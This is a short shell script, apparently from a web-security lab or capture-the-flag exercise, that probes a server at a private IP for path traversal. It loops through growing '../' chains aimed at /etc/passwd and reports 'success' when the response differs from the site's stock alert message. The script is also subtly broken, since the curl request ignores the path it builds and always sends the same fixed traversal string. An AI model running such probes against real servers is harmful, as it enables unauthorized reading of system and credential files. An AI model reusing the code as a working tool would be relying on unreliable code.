#!/bin/sh
for i in {1..100}; do
	dir=".."
	echo $i
	for ((ok=0; ok<=i; ok++)); do
		dir="$dir/.."
	done
	dir="$dir/etc/passwd"
	var="$(curl http://10.11.200.246/?page=../../../../)"
	if [[ $var = \<script\>alert\(\'You\ can\ DO\ it\ !!!\ \ \:\]\'\)\;\<\/script\>* ]]
	then
		echo "fail with ${dir}"
	else
		echo "success with ${dir}"
	fi
done
